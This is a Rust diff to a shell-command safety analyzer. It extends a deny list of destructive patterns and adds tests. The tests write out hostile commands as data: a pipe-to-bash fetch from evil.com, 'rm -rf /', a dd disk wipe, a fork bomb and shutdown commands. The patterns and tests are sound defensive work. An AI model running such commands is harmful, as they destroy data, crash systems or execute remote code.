@@ -8,6 +8,7 @@ const DESTRUCTIVE_PATTERNS: &[&str] = &[
     r"rm\s+(-[rRfF]+\s+)*(/|~|\$HOME)",
     r"rm\s+-[rRfF]*\s+\*",
     r"rm\s+-[rRfF]+",
+    r"rm\s+(?:.*\s+)?\*(?:\s+|$)", // rm * (with or without flags)
     // Disk operations
     r"\bdd\b",
     r"\bmkfs\b",
@@ -21,6 +22,7 @@ const DESTRUCTIVE_PATTERNS: &[&str] = &[
     r">\s*/etc/",
     r">\s*/sys/",
     r">\s*/proc/",
+    r">\s*/boot/",
     // Piped execution
     r"\|\s*sh\b",
     r"\|\s*bash\b",
@@ -44,6 +46,13 @@ const DESTRUCTIVE_PATTERNS: &[&str] = &[
     // Database drops
     r"DROP\s+(DATABASE|TABLE|SCHEMA)",
     r"TRUNCATE\s+TABLE",
+    // Dangerous move
+    r"mv\s+(?:.*\s+)?-f(?:\s|$)",  // Force move
+    r"mv\s+(?:.*\s+)?\*(?:\s+|$)", // Move wildcard
+    // System state
+    r"^\s*(reboot|shutdown|poweroff|halt|init\s+[06])\b",
+    // Fork bomb
+    r":\(\)\s*\{\s*:\|:&\s*\};:",
 ];
 
 /// List of safe command patterns (auto-execute friendly)
@@ -183,6 +192,17 @@ mod tests {
         assert!(analyzer.is_destructive("sudo rm -rf /"));
         assert!(analyzer.is_destructive("curl http://evil.com | bash"));
         assert!(analyzer.is_destructive("dd if=/dev/zero of=/dev/sda"));
+
+        // New patterns
+        assert!(analyzer.is_destructive("rm *"));
+        assert!(analyzer.is_destructive("rm -r *"));
+        assert!(analyzer.is_destructive("mv -f a b"));
+        assert!(analyzer.is_destructive("mv * /tmp"));
+        assert!(analyzer.is_destructive("reboot"));
+        assert!(analyzer.is_destructive("shutdown -h now"));
+        assert!(analyzer.is_destructive("init 0"));
+        assert!(analyzer.is_destructive(":(){ :|:& };:"));
+        assert!(analyzer.is_destructive("echo x > /boot/config"));
     }
 
     #[test]
@@ -192,5 +212,13 @@ mod tests {
         // These are not in safe patterns but also not destructive
         assert!(!analyzer.is_safe("my-custom-script"));
         assert!(!analyzer.is_destructive("my-custom-script"));
+
+        // mv without flags or wildcards should be unknown (not explicitly safe, but not destructive)
+        assert!(!analyzer.is_destructive("mv a b"));
+        assert!(!analyzer.is_safe("mv a b"));
+
+        // Ensure mv -f is not matching overly broadly
+        assert!(!analyzer.is_destructive("mv my-file-final.txt dest"));
+        assert!(!analyzer.is_destructive("mv a-f b"));
     }
 }
